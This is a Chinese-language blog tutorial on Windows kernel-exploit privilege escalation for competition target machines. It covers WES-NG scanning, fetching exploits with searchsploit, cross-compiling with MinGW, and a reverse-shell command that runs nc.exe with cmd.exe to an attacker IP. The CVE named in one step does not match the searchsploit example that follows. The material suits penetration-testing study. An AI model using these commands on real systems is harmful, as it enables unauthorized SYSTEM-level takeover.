---
title: Windows提权5：内核漏洞
date: 2026-03-21 11:00:00
tags:
- 提权
- Windows
- 内核
categories:
- ISW
- Windows提权
---



# 前言：

当靶机的权限配置滴水不漏、吃不了土豆、翻不到密码时，只能打Windows 内核漏洞（如经典的 MS16-032，或者近年来的 PrintNightmare, CVE-2023-21768）能直接从操作系统最底层的内存 Ring0 级别强行拔高你的权限。

**为什么这是最后手段？** 因为内核漏洞极不稳定，一旦利用失败（比如内存偏移量没算准），靶机会**瞬间蓝屏死机**。在比赛中这可能导致靶机重置，在实战中会导致业务崩溃+立刻暴露。**所以，永远把内核强打放在提权手法的最后一位。**



# 内核利用流程：

## Step 1: 收集靶机的信息

在低权限靶机的黑框框里，把系统的详细版本和打过的补丁历史全导出来：

```bash
systeminfo > C:\Windows\Temp\sysinfo.txt
```

用蚁剑、冰蝎或者 `certutil` 配合你在 Ubuntu 开的接收端，把这个 `sysinfo.txt` 拿回你的攻击机。

## Step 2: WES-NG扫描

```bash
python3 wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
```



* `-i 'Elevation of Privilege'`：只要“提权”漏洞。

* `--exploits-only`：只列出那些在 GitHub 或 Exploit-DB 上**已经有现成可用武器代码**的漏洞。

## Step 3: 准备 EXP

假设 WES-NG 的输出告诉你，这台机器大概率存在 `CVE-2023-21768` (Windows AFD 本地提权漏洞)，拿到 CVE 编号后，直接在 Ubuntu 里调用本地 EDB 搜刮源码：

```bash
# 搜索该 CVE 对应的 Windows 本地提权漏洞
searchsploit CVE-2016-0099 windows local

# 将找到的 C 语言源码或脚本拷贝到当前目录 (假设 ID 是 39719)
searchsploit -m 39719
```

## Step 4: 交叉编译

从 EDB 拷出来的往往是一个 `39719.c` 的 C 语言源码文件。**你不能用普通的 `gcc` 去编译它，因为那是给 Linux 生成 ELF 文件的**

你必须使用 **MinGW-w64** 把它编译成 Windows 认识的 `.exe`。

```bash
# 编译为 Windows 64位可执行文件 (-lws2_32 是链接 Windows 网络库，很多 EXP 需要)
x86_64-w64-mingw32-gcc 39719.c -o exp.exe -lws2_32

# 如果是老旧的 32 位系统靶机，则使用：
i686-w64-mingw32-gcc 39719.c -o exp32.exe -lws2_32
```

## Step 5: 投递exp

把你的 `exp.exe` 和反弹 Shell 用的 `nc.exe` 一起传到靶机的 `C:\Windows\Temp\`。

大部分优秀的内核 EXP 都支持在后面带上你要执行的命令。在靶机 CMD 中敲下：

```bash
C:\Windows\Temp\exp.exe "C:\Windows\Temp\nc.exe 10.243.120.200 4444 -e cmd.exe"
```

如果运气好没有蓝屏，ubuntu就有system权限的反弹shell了

或者直接运行

```bash
C:\Windows\Temp\exp.exe
```

在对应终端也能拿到system



# 必备经典老洞

虽然你会了交叉编译，但在分秒必争的比赛中，以下四个经典漏洞请**务必提前在有网的环境下载好预编译的稳定版 `.exe`** 放在你的工具包里

1. **MS16-032 (Secondary Logon 提权)**
   
   * 极其稳定，几乎不蓝屏，老系统通杀。有著名的 PowerShell 版脚本 `Invoke-MS16032.ps1`，直接内存加载，无需编译。

2. **MS14-058 (TrackPopupMenu 提权)**
   
   * Win7 / Server 2008 必备。

3. **MS15-051 (Win32k 提权)**
   
   * 对应 EXP 常被叫做 `ms15-051.exe` 或 `ms15-051x64.exe`。

4. **CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)**
   
   * 如果遇到 Server 2019 没打补丁，直接秒杀。


